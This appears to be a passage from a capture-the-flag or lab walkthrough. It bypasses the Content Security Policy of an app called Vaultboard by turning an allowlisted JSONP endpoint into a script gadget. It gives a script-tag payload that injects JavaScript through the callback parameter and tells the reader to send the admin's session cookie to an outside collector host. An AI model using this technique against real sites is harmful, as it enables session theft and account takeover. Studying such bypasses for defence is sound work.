The allowlisted host is `http://accounts-trusted:8080`. Probe it:

```
GET http://accounts-trusted:8080/api/jsonp?callback=test
    →  test({"authenticated": false, "user": null});
```

That is a **JSONP endpoint**, and it echoes your `callback` name **verbatim** into
an executable position. Whatever you pass as `callback` becomes the beginning of a
JavaScript statement — so it is a _script gadget_ on an allowlisted origin.

You cannot run inline script, but you **can** load a script whose `src` is that
host. So reflect:

```html
<script src="http://accounts-trusted:8080/api/jsonp?callback=YOUR_JS//"></script>
```

The CSP allows the source (allowlisted host); the JSONP turns `YOUR_JS` into code;
the trailing `//` comments out the `({...})` the endpoint appends. Your code runs
in Vaultboard's origin — where the admin's non-HttpOnly `session` cookie lives.
Make `YOUR_JS` beacon `document.cookie` to `http://collector:9000/report?c=`.
